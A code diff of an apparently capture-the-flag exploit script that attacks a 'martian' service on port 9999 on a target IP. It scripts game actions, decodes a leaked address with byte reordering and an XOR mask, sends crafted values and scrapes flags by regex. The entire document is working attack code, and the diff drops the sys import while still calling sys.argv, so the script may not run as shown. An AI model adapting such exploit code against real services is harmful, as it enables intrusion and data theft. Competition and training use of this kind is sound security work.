@@ -1,14 +1,13 @@
 #!/usr/bin/env python
 from sploit_lib import *
 import re
-import sys
+from time import sleep 
 
-ip = sys.argv[1]
 flag_regexp = r"[A-Z0-9]{31}="
 
 if __name__ == "__main__":
 
-	p = remote( ip, 9999 )
+	p = remote( sys.argv[ 1 ], 9999 )
 	#p = process( "./martian" )
 
 	username, password = generate_correct_random_name(), generate_correct_random_password()
@@ -22,7 +21,7 @@ if __name__ == "__main__":
 		read_book( p, 24 )
 		go_to_next_day( p )
 
-	# 1 day
+	# 1 day 
 	for i in range( 8 ):
 		easy_raid( p )
 	go_to_next_day( p )
@@ -53,7 +52,7 @@ if __name__ == "__main__":
 		p.send( "n\n" )
 
 	buf = p.recvuntil( b": " )
-
+	
 	p.send( "y\n" )
 	p.recvuntil( "> " )
 	p.send( "1\n" ) # view
@@ -73,7 +72,7 @@ if __name__ == "__main__":
 	_switched = [i for i in range( len( nums ) ) ]
 
 	_switched[ 0 ] = nums[ 4 ]
-	_switched[ 1 ] = nums[ 3 ]
+	_switched[ 1 ] = nums[ 3 ] 
 	_switched[ 2 ] = nums[ 7 ]
 	_switched[ 3 ] = nums[ 1 ]
 	_switched[ 4 ] = nums[ 0 ]
@@ -86,13 +85,13 @@ if __name__ == "__main__":
 	for i in range( len( _switched ) ):
 		_byte = _switched[ i ]
 
-		value += ( _byte << ( 56 - i * 8 ) )
+		value += ( _byte << ( 56 - i * 8 ) ) 
 
-	# restore addr
+	# restore addr 
 	value = value << 1
 	value ^= 0xcafebabedeadbeef
-
-	#	print "addr: 0x%x" % value
+	
+	#	print "addr: 0x%x" % value 
 
 	#p.interactive()
 
@@ -106,22 +105,24 @@ if __name__ == "__main__":
 		p.send( "-\n" )
 
 	p.recvuntil( ": " )
-	p.send( str( value & 0xffffffff ) + '\n' )
-
+	p.send( str( (value-1) & 0xffffffff ) + '\n' )
+	
 	p.recvuntil( ": " )
 	p.send( str( value // 0xffffffff ) + '\n' )
-
+	
 	p.recvuntil( ": " )
 	p.send( "2048\n" )
-
+	
 	for i in range( 5 ):
 		p.recvuntil( ": " )
 		p.send( "-\n" )
 
+	sleep( 2 )
+
 	#p.interactive()
-	buf = p.recvuntil( "voltage[0]" )
-	print re.findall( flag_regexp, buf)
-	sys.stdout.flush()
+	buf = p.recvuntil( "voltage[" )
+	print re.findall( flag_regexp, buf )
+	#print buf
 
 	p.close()
-
+	
